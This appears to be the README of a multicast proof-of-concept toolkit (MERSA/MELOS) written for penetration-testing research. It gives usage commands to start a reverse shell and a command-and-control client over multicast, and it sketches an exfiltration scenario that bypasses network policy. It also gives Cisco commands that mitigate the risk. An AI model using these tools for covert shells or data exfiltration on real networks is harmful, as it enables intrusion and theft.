# Multicast Encrypted RSA (MERSA)
```python
     o       .                         o      .
                      .
    .   dBBBBBBBb dBBBBP dBBBBBb  dBBBBP dBBBBBb 
       dB'   'dP dB     dB  dBP dBP'         'BB' 
      dB'dB'dB' dBBP   dBBBBP' 'BBBBb   dBBBPBB'  
     dB'dB'dB' dBP    dBP  BB     dBP  dBP   BB' 
    dB'dB'dB' dBBBBP dBP  dB  dBBBBP' 'dBBBBBB' 
       .                       o                  
                    .                     .    
  .       |      
        --o--     MERSA by 0xFNDH     .
          | Zero eXcuses For Non-Dreamers    o
      o               .  
```

# Overview

 - [Documentation](./README.md#About)
 - [PoC Testing Tools](./PoC/)
 - [Configuration Solutions](./README.md#Patching)
 - [Program Usage Example](./README.md#MELOS-Usage)
 - [Additional Information](./README.md#Additional-Information)

# About

The goal of the PoC is to highlight the security issues of multicast-enabled networks and to create solutions to prevent incidences before they occur. Multicast Encrypted RSA (MERSA) and Multicast Encrypted Low Operations Shell (MELOS) are tools that demonstrate this by undermining network security policies and bypassing Client/AP isolation.

The idea for MERSA is based on the post-exploitation stage of the penetration testing process as an evasive way to conduct data exfiltration and information gathering. During a penetration test, once multiple devices have been compromised, MERSA can be run to execute commands on a device over multicast while evading certain network security controls. This methodology can also reduce the footprint of activity on the network during a penetration test.

MERSA can also create an opportunity for lateral movement within or across segments, depending on router configurations, once access to a device within a separate segment has been obtained. Multicast uses either IGMP (L3) or PIM (L2) to route packets and operates outside of the Internet Protocol (IP). Therefore, security controls for Internet Protocol traffic do not affect multicast as long as the devices are in the same VLAN.

# Patching

> Configuring your network with VLANs and proper configurations can mitigate most of the risks associated with multicast.

> Please consult your network administrator prior to making any changes to router configurations. Making unscheduled modifications to the configurations can have adverse effects on the services or devices operating within the network.

**How to disable multicast for Cisco IOS XE 3.2SE+**

> We advise disabling multicast on the interfaces that face public access points. This helps prevent potential issues that may arise from globally disabling multicast. 

```ruby
! Disable all multicast traffic
router(config)# no ip multicast-routing
router(config)# no ip igmp
router(config)# no ip pim

! Disable multicast on a specific interface
router(config)# interface gigabitethernet 0/0/0
router(config-if)# no ip multicast-routing
router(config-if)# no ip igmp
router(config-if)# no ip pim
router(config-if)# end
```

**How to log multicast interactions for Cisco IOS XE Everest 16.6.1+**
> Enabling logs can assist the incident response team in investigating a breach.
```ruby
! Permit a range for allowed multicast channels
router(config)# ip igmp profile 40
router(config-igmp-profile)# permit
router(config-igmp-profile)# range 224.0.0.1 233.255.255.255
router(config-igmp-profile)# exit
router(config)# interface gigabitethernet 0/0/0
router(config-if)# switchport
router(config-if)# ip igmp filter 40
router(config-if)# end

! Dedicate percentage of memory for caching multicast
router(config-mdns)# cache-memory-max 10

! Enable explicit tracking of hosts, groups, and channels for IGMPv3
! When explicit tracking is enabled, the device will use more memory
router(config)# ip multicast-routing
router(config)# interface gigabitethernet 0/0/0
router(config-if)# ip pim sparse-dense-mode 
router(config-if)# ip igmp version 3 
router(config-if)# ip igmp explicit-tracking
router(config-if)# end

```

**How to prevent unnecessary forwarding of multicast packets Cisco IOS XE 3.2SE+**
> Network switches may be unaware of which network devices are part of multicast groups, and which are not. It may end up forwarding multicast traffic to devices that do not need it, which takes up network bandwidth and device processing power, slowing the entire network down. IGMP Snooping allows the switch to follow communications and stop forwarding packets when unnecessary.
```ruby
! Enable IGMP Snooping Globally
router(config)# ip igmp snooping
! Enable IGMP Snooping for a VLAN
router(config)# ip igmp snooping vlan 10

! PIM Sparse Mode (PIM-SM) will reduce the spread of multicast traffic
router(config)# interface gigabitethernet 0/0/0
router(config-if)# ip pim sparse-mode
router(config-if)# end
```

# MELOS Usage

**Start 'MELOS.py -l' reverse shell on target**
> Changing the password will allow MELOS to run on multiple hosts at the same time.

```csharp
$ python3 melos.py --listen --password M3L05

    =[ Awaiting on 224.0.0.251:10020    ]

[10.200.40.5:55000] whoami
[10.200.40.5:55000] ifconfig
[10.200.40.5:55000] ls

```

**Start 'MELOS.py -c' command and control client**
> The password must be the same as the client otherwise the commands will not be decrypted.

```csharp
$ python3 melos.py --cmd --password M3L05

    =[ MELOS C2 224.0.0.251:10050       ]
    
melos@224.0.0.251:10050 $ whoami
     =[ Packet From 10.250.60.15:55000  ]
root
```

# MERSA Usage

```python
$ python3 mersa.py

     =[ Type 'discover' to find hosts.   ]

MERSA(host-id) % discover
[JOIN] 10.200.40.5:55000 has joined.
MERSA(host-id) % 0
MERSA(10.200.40.5) % hi
[MSG-RECV][10.200.40.5:55000] b'hello'

```

# Additional Information

## Attack Scenario
> Imagine that you are in a network that hosts a webserver, but due to network restrictions, you cannot interact with it or observe its traffic. By launching an attack on the external webpage and acquiring code execution, you can utilize MELOS to gain a reverse shell. This will enable you to exfiltrate files and data through the network to your device without being denied by the current policies. The use of MELOS and MERSA will depend on factors such as the network type, current configurations, and the number of security layers in place. However, if remote code execution is already established, it's probable that multicast has been not considered in the network's security measures.

## Tremeris Kynigoskylo (Three Headed Hound)
> MERSA is a less potent iteration of the Tremeris Kynigoskylo (TK-PoC) software developed by 0xFNDH. MERSA poses a significantly lower risk and can be detected through various network intrusion detection systems and network monitoring applications. However, TK-PoC was created to covertly extract files from internal networks without being detected or displaying any unusual activity. MERSA and MELOS are proof-of-concept and do NOT demonstrate the full exploitability of multicast. If your goal is to maximize the effective security of your network, please take into consideration how protocols like multicast move throughout your network.

> This research is designed to raise awareness of the potential risks associated with IGMP and multicast. 

## Resources

> [Cisco Multicast Commands](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3850/software/release/16-12/command_reference/b_1612_3850_cr/ip_multicast_routing_commands.html)

> [Cloudflare IGMP Introduction](https://www.cloudflare.com/learning/network-layer/what-is-igmp/)

> [IANA Multicast Addresses](https://www.iana.org/assignments/multicast-addresses/multicast-addresses.xhtml)
